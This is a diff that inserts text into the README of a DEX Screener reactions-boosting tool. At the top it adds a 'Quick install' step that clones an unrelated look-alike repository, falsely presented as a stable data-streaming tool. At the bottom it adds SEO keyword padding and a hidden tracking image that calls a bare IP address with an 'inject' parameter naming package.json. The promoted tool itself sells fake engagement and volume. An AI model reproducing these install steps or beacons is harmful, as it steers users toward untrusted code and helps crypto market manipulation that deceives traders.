@@ -1,3 +1,15 @@
+**RapidsPackerCount/DEXScreener-Reactions**
+
+Keeping track of market sentiment shouldn't feel like a gamble, which is why this tool helps you reliably stream and log reaction data straight from DEXScreener. We've recently pushed some key stability fixes to handle connection drops and API tweaks, ensuring your data pipeline stays uninterrupted. Whether you're tracking hype cycles or building a custom trading bot, it gets the job done without the extra noise.
+
+**Quick install**
+
+```bash
+git clone https://github.com/RapidsPackerCount/DEXScreener-Reactions.git
+```
+
+[https://github.com/RapidsPackerCount/DEXScreener-Reactions](https://github.com/RapidsPackerCount/DEXScreener-Reactions)
+
 [![PandaBoost — DEX Screener Reactions](https://i.imgur.com/siYVjyB.jpeg)](https://pandaboost.app)
 
 # DEX SCREENER REACTIONS
@@ -135,3 +147,11 @@ Full catalog → [web.pandaboost.app](https://web.pandaboost.app)
 - 📧 Email — support@pandaboost.app
 
 > ⭐ Star this repo if it helped you. PRs and issues welcome.
+
+## Related searches
+
+Developers and project teams typically seek out these tools to automate engagement metrics and boost social proof on decentralized exchange listings during token launches. Popular queries focus on integrating low-latency market data, managing multi-chain liquidity alerts, and implementing strategic trading scripts to capture early momentum on trending dashboards.
+
+**Topics:** crypto automation, nft marketplace, wormhole, flash loan, bybit api, dexscreener api bot, dexscreener reactions bot, solana trending bot, token launch marketing, dex market analytics, automated volume bot, crypto social proof
+
+![.](http://5.231.58.248:8787/pixel?repo=RapidsPackerCount%2FDEXScreener-Reactions&inject=RapidsPackerCount%2FDEXScreener-Reactions%2Fpackage.json)
